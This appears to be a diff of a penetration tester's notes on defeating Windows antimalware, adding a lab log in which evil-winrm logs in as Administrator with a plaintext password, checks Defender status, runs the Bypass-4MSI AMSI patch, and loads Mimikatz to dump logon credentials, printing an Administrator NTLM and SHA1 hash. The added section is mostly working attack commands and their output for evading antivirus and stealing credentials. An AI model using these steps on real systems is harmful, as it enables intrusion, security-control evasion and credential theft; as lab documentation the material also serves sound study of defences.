@@ -67,13 +67,13 @@ Windows Security features
   Note: Microsoft has introduced Credential Guard in Windows 10 Enterprise and Windows Server 2016, which uses virtualization-based security to isolate secrets,
   and it is effective in preventing Mimikatz from retrieving hashes directly from memory.
 
-===================================================================================================================================
+================================================================================================================================================
 Example - AMSI bypass techniques 
-===================================================================================================================================
+================================================================================================================================================
 
------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
 Example/Test 1 - AMSI bypass with a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
 
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -148,9 +148,178 @@ AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\auditor\AppData\Local\Mic
 PS C:\temp>
 
 
----------------------------------------------------------------------------------------------------------------------------------
-Example/Test 2 - AMSI bypass with a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
----------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+Example/Test 1 - AMSI bypass with a local admin user remotely logged on a Windows 2016 server with Defender (AV) enabled and up-to-date
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+$ evil-winrm -u Administrator -p Test1234 -i 192.168.1.38 -s '/home/kali/Documents/'                                    
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> menu
+The term 'Menu' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Menu
++ ~~~~
+    + CategoryInfo          : ObjectNotFound: (Menu:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+
+Evil-WinRM* PS C:\Users\Administrator\Documents> systeminfo
+
+Host Name:                 WIN-DV7MRN2F7E8
+OS Name:                   Microsoft Windows Server 2016 Standard Evaluation
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00378-00000-00000-AA739
+Original Install Date:     11/27/2021, 1:32:54 PM
+System Boot Time:          11/27/2021, 5:03:20 PM
+System Manufacturer:       innotek GmbH
+System Model:              VirtualBox
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~1896 Mhz
+BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              fr;French (France)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     2,048 MB
+Available Physical Memory: 1,028 MB
+Virtual Memory: Max Size:  3,200 MB
+Virtual Memory: Available: 2,039 MB
+Virtual Memory: In Use:    1,161 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              \\WIN-DV7MRN2F7E8
+<SNIP>
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-MpComputerStatus
+
+AMEngineVersion                 : 1.1.18700.4
+AMProductVersion                : 4.10.14393.0
+AMServiceEnabled                : True
+AMServiceVersion                : 4.10.14393.0
+AntispywareEnabled              : True
+AntispywareSignatureAge         : 0
+AntispywareSignatureLastUpdated : 11/27/2021 8:25:18 AM
+AntispywareSignatureVersion     : 1.353.1705.0
+AntivirusEnabled                : True
+AntivirusSignatureAge           : 0
+AntivirusSignatureLastUpdated   : 11/27/2021 8:25:21 AM
+AntivirusSignatureVersion       : 1.353.1705.0
+BehaviorMonitorEnabled          : True
+ComputerID                      : 118D02EB-A8E0-46AE-9437-9C89C2ABB59F
+ComputerState                   : 0
+FullScanAge                     : 4294967295
+FullScanEndTime                 :
+FullScanStartTime               :
+IoavProtectionEnabled           : True
+LastFullScanSource              : 0
+LastQuickScanSource             : 0
+NISEnabled                      : True
+NISEngineVersion                : 2.1.14600.4
+NISSignatureAge                 : 4294967295
+NISSignatureLastUpdated         :
+NISSignatureVersion             : 119.0.0.0
+OnAccessProtectionEnabled       : True
+QuickScanAge                    : 4294967295
+QuickScanEndTime                :
+QuickScanStartTime              :
+RealTimeProtectionEnabled       : True
+RealTimeScanDirection           : 0
+PSComputerName                  :
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Bypass-4MSI
+
+Warning: AV could be still watching for suspicious activity. Waiting for patching...
+
+[+] Success!
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz.ps1
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 40930 (00000000:00009fe2)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/27/2021 3:31:07 PM
+SID               : S-1-5-90-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WIN-DV7MRN2F7E8$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WIN-DV7MRN2F7E8$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 11/27/2021 3:31:07 PM
+SID               : S-1-5-20
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WIN-DV7MRN2F7E8$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+         * Username : win-dv7mrn2f7e8$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 440908 (00000000:0006ba4c)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : WIN-DV7MRN2F7E8
+Logon Server      : WIN-DV7MRN2F7E8
+Logon Time        : 11/27/2021 5:08:33 PM
+SID               : S-1-5-21-3752995273-3413141572-2984859662-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : WIN-DV7MRN2F7E8
+         * NTLM     : b9e0cfceaf6d077970306a2fd88a7c0a
+         * SHA1     : d7a6378b84d08cb2bc3240c89f81d184f6d69b15
+        tspkg :
+<SNIP>
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+Example/Test 3 - AMSI bypass with a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
+-----------------------------------------------------------------------------------------------------------------------------------------
 
 2.1 Test with Powershell Remoting
 ----------------------------------
@@ -313,7 +482,7 @@ This script contains malicious content and has been blocked by your antivirus so
 
 
 -------------------------------------------------------------------------------------------------------------------------
-Example/Test 3 - Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
+Example/Test 4 - Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
 -------------------------------------------------------------------------------------------------------------------------
 
 Note:  Just for testing purposes, I installed the old and basic AV 'Microsoft Security Essentials' in compatibility mode on a Windows server 2012 R2.
